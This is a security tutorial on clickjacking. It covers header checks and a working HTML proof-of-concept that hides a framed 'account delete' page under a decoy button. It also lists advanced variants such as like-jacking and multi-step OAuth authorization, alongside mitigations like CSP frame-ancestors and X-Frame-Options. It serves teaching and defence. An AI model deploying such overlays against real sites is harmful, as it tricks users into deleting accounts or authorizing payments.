# What is Clickjacking?

Clickjacking (UI redress) tricks a user into clicking something different from what they think they are clicking. The attacker loads the target site in a transparent iframe over a decoy page, so a click on the decoy actually hits a sensitive button on the target - "delete account", "authorize payment", "grant OAuth". It only works when the target lets itself be framed.

## How it works

- Attacker page frames the target site with `opacity: 0`
- A decoy button is positioned exactly under the real target button
- The victim clicks the decoy and the click lands on the framed site

## Step 1 - Check if the target can be framed

Only sites that **allow framing** are vulnerable. Check the response headers:

```bash
curl -sI https://target.tld/account/delete | grep -iE "x-frame-options|content-security-policy"
```

- No `X-Frame-Options` and no CSP `frame-ancestors` -> **framable, likely vulnerable**
- `X-Frame-Options: DENY` or `frame-ancestors 'none'` -> not vulnerable

## Step 2 - Proof-of-concept (basic overlay)

```html
<style>
  iframe {
    position: absolute; top: 0; left: 0;
    width: 800px; height: 600px;
    opacity: 0.0;          /* invisible; set to 0.2 while building/aligning */
    z-index: 2;
  }
  #decoy {
    position: absolute; top: 220px; left: 310px;   /* align under the real button */
    z-index: 1;
  }
</style>

<button id="decoy">Click here to win a prize!</button>
<iframe src="https://target.tld/account/delete"></iframe>
```

Tune `top`/`left` (with opacity 0.2) until your decoy sits exactly under the target's "Delete" button, then set opacity to 0.

## Step 3 - Advanced variants

- **Drag-and-drop / like-jacking** - trick the user into dragging or clicking through multiple frames.
- **Filling forms** - prefill hidden iframe inputs via URL params, then trick the user into submitting.
- **Multi-step** - stack decoys to complete a flow (e.g. OAuth "Authorize").

## Tools

- [Burp Suite Clickbandit](https://portswigger.net/burp) - auto-generates a clickjacking PoC
- Browser DevTools - verify `X-Frame-Options` and CSP `frame-ancestors`

## Mitigation - the fix

- **CSP `frame-ancestors`** (modern, primary control):

```text
Content-Security-Policy: frame-ancestors 'self';
Content-Security-Policy: frame-ancestors 'none';   # never framable
```

- **`X-Frame-Options: DENY`** (or `SAMEORIGIN`) for older browsers.
- Require re-authentication/confirmation for destructive actions.
- `SameSite=Strict/Lax` cookies so framed cross-site requests don't carry the session.

## Practice

- [PortSwigger clickjacking labs](https://portswigger.net/web-security/clickjacking)

## Deep dive

- [Clickjacking - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

## CWE

- CWE-1021: Improper Restriction of Rendered UI Layers or Frames
